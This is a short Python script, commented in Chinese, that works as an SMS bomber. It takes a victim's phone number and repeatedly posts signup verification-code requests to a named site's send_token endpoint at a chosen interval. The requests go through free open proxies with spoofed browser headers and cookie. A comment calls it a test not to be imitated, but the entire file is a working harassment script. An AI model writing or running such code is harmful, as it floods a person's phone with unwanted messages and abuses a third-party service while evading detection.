#
#免费代理网址：http://www.xicidaili.com/
#小小的测试，请勿模仿
#http://www.demlution.com/capi/v1/dmhome/send_token
import requests
import json
import time
proxies = { "http": "http://58.216.202.149:8118", "https": "http://221.3.39.207:8118", }  
headers = {'User-Agent'  : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0','Cookie': 'da_a=97199645','Referer': 'http://www.demlution.com/'}
phone = input("请输入电话号码：\n")
rate = input("请输入频率(*秒每次)：\n")
while(True):
    try:
        r = requests.post('***',data=json.dumps({"mobile":phone,"type":"signup"}),headers=headers,proxies=proxies)
        print(r.text)
    except:
        print("出错了，请稍等..将重新启动")
    rate = int(rate)
    time.sleep(rate)

